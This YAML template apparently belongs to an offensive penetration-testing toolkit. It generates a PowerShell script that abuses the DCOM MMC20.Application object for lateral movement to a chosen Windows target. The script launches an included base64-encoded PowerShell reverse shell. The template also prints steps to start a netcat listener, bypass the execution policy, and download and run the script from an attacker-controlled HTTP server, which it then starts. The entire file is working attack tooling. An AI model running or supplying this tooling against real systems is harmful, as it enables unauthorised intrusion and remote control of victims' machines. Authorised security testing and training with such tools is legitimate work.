metadata:
  filename: lateral-movement-template-DCOM-powershell-revshell.yaml
  tags:
  - shell
  - windows
  created: '2025-03-29'
  author: Unknown
content: "echo \"Answer the following with  a target ip. A powershell script will\
  \ be generated. If successful, a revshell can be caught at port {{ shell_port }}\
  \ of your kali.\"; \\\nread --prompt-str \"Target IP:\" target; \\\n\necho \"\\\
  $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','$target'));\"\
  \ > lateral-movement-dcom.ps1; \\\necho \"\\$dcom.Document.ActiveView.ExecuteShellCommand('powershell',\\\
  $null,'{{ include('payloads/revshell-windows-powershell-oneliner-base64encoded.yaml')\
  \ }}','7');\" >> lateral-movement-dcom.ps1; \\\n\nmkdir -p packstation/outbound;\
  \ mv lateral-movement-dcom.ps1 packstation/outbound/; \\\necho '================================================================';\
  \ \\\necho '                      -----PowerShell-----                      '; \\\
  \necho 'Preparation 1 (start listener): {{ include('scripts/listener-nc.yaml') }}';\
  \ \\\necho 'Without bypass: Open the created file lateral-movement-dcom.ps1 and\
  \ paste in line by line into powershell'; \\\necho 'Preparation 2 (for save to disk\
  \ only): powershell -ep bypass'; \\\necho 'Deliver & save to disk: iwr -uri http://{{\
  \ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-dcom.ps1 -Outfile\
  \ {{ delivery_path_windows }}\\lateral-movement-dcom.ps1'; \\\necho 'Deliver, save\
  \ to disk & execute: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
  \ }}/lateral-movement-dcom.ps1 -Outfile {{ delivery_path_windows }}\\lateral-movement-dcom.ps1;\
  \ {{ delivery_path_windows }}\\lateral-movement-dcom.ps1'; \\\necho '================================================================';\
  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
  \ delivery_outbound_port }} -d packstation/outbound\n"
